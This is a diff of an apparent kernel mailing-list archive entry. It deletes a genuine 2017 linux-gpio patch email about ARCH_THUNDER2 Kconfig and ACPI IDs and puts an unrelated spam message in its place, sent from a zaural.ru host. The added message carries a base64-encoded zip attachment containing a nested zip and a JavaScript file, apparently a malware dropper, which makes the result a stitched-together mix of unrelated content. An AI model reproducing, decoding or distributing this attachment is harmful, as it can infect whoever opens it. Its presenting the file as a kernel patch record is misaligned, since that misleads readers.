@@ -1,59 +1,114 @@
-From: Jayachandran C <jnair@caviumnetworks.com>
-Subject: [PATCH] gpio: xlp: Update for ARCH_THUNDER2
-Date: Sun, 12 Mar 2017 11:14:28 +0000
-Message-ID: <1489317268-5376-1-git-send-email-jnair@caviumnetworks.com>
+From: <iles@appliedis.com>
+Subject: 54339 linux-gpio
+Date: Sun, 12 Mar 2017 22:59:26 -0000
+Message-ID: <148935956654.30107.16643288214086288156@zaural.ru>
+Reply-To: <iles@appliedis.com>
 Mime-Version: 1.0
-Content-Type: text/plain
+Content-Type: application/zip; name="6812707731408.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-gpio-owner@vger.kernel.org>
-Received: from mail-sn1nam02on0041.outbound.protection.outlook.com ([104.47.36.41]:51781
-        "EHLO NAM02-SN1-obe.outbound.protection.outlook.com"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1755667AbdCLLPD (ORCPT <rfc822;linux-gpio@vger.kernel.org>);
-        Sun, 12 Mar 2017 07:15:03 -0400
+Received: from ws6.zone31-163-168.zaural.ru ([31.163.168.6]:43760 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S933192AbdCLW7a (ORCPT <rfc822;linux-gpio@vger.kernel.org>);
+        Sun, 12 Mar 2017 18:59:30 -0400
+Content-Disposition: attachment
 Sender: linux-gpio-owner@vger.kernel.org
 List-Id: linux-gpio@vger.kernel.org
-To: linux-gpio@vger.kernel.org, Linus Walleij <linus.walleij@linaro.org>, Kamlakant.Patel@cavium.com
-Cc: Jayachandran C <jnair@caviumnetworks.com>
+To: linux-gpio <linux-gpio@vger.kernel.org>
 
-ARCH_VULCAN arm64 platform (for Broadcom Vulcan ARM64 processors) has
-been discontinued. Cavium's ThunderX2 CN99XX (ARCH_THUNDER2) will be
-the next revision of this platform.
-
-Update compile dependencies and ACPI ID to reflect this change. There
-is not need to retain ARCH_VULCAN since the Vulcan processor was never
-in production.
-
-Signed-off-by: Jayachandran C <jnair@caviumnetworks.com>
----
- drivers/gpio/Kconfig    | 2 +-
- drivers/gpio/gpio-xlp.c | 1 +
- 2 files changed, 2 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/gpio/Kconfig b/drivers/gpio/Kconfig
-index 0504307..a3f0b4e 100644
---- a/drivers/gpio/Kconfig
-+++ b/drivers/gpio/Kconfig
-@@ -505,7 +505,7 @@ config GPIO_XILINX
- 
- config GPIO_XLP
- 	tristate "Netlogic XLP GPIO support"
--	depends on OF_GPIO && (CPU_XLP || ARCH_VULCAN || COMPILE_TEST)
-+	depends on OF_GPIO && (CPU_XLP || ARCH_THUNDER2 || COMPILE_TEST)
- 	select GPIOLIB_IRQCHIP
- 	help
- 	  This driver provides support for GPIO interface on Netlogic XLP MIPS64
-diff --git a/drivers/gpio/gpio-xlp.c b/drivers/gpio/gpio-xlp.c
-index 4620d05..15d7669 100644
---- a/drivers/gpio/gpio-xlp.c
-+++ b/drivers/gpio/gpio-xlp.c
-@@ -441,6 +441,7 @@ static int xlp_gpio_probe(struct platform_device *pdev)
- #ifdef CONFIG_ACPI
- static const struct acpi_device_id xlp_gpio_acpi_match[] = {
- 	{ "BRCM9006", GPIO_VARIANT_VULCAN },
-+	{ "CAV9006",  GPIO_VARIANT_VULCAN },
- 	{},
- };
- MODULE_DEVICE_TABLE(acpi, xlp_gpio_acpi_match);
--- 
-2.7.4
-
+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
+AAAAAA==
